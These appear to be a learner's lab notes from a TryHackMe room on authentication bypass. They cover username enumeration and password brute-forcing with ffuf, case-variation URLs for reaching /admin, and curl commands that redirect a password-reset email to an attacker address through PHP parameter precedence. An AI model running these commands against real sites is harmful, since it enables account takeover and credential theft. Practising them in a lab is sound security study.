# Authentication Bypass
## Username Enumeration
- Try a random username that probably does not exist, and then try one that probably exists, is there a different error?
````
jksaljkfl <- username that does not exist
admin <- username that probably exists
guest <- another potential username
````
- We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below
- The ffuf tool uses a list of commonly used usernames to check against for any matches.
- Capture the request in `Burp` to find the `Content-Type`, whether its a `GET` or `POST`
````
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
````
- `-w` -> selects the file's location
- `-X` -> argument specifies the request method
- `-d` -> the data that we are going to send
- `FUZZ` -> keyword signifies where the contents from our wordlist will be inserted in the request
- `-H` -> for adding additional headers to the request
- `-u` ->  specifies the URL we are making the request to
- `-mr` -> is the text on the page we are looking for to validate we've found a valid username
## Password Brute force attack
````
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
````
- Previously we used the FUZZ keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword.
- `W1` -> for our valid list of usernames
- `W2` -> for the list of passwords we are going to try
- `-w` -> the multiple word lists are also specified with this flag
- `-fc` -> this argument check for an HTTP status code other than a 200
## Authentication Bypass Logic Flaw
- If a specific url is blocked without authentication like `/admin`, depending on the code you may be able to bypass it.
- Try:
````
/adMin
/aDmIn
````
### Finding password reset forms
- If there is an option always make an account. There could be pages you have access to that you otherwise would not.
- Also if there is a password reset option on the site you might be able to get their password reset link sent to you.
- ![alt text](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f457baf00c357990014739bd6bce5b75.png)
- Use curl to figure out how the parameters are passed to the server, in this example the username is a `POST` field and the email address is a `GET` field
````
curl 'http://10.10.115.78/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
````
- `-H` -> to add an additional header to the request.  In this case we are setting the `Content-Type` to `application/x-www-form-urlencoded`
- Can find this out in burp, or set something ourselves
- The `PHP $_REQUEST` variable is an array that contains data received from the query string and POST data. - If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form
- We can control where the password reset email gets delivered.
````
curl 'http://10.10.115.78/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
````
- ![alt text](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3d97e3e37bf9e4db4f95f4f945a7e290.png)
- Now re-running the curl command we can alter where the reset link is sent
````
curl 'http://10.10.115.78/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
````






































































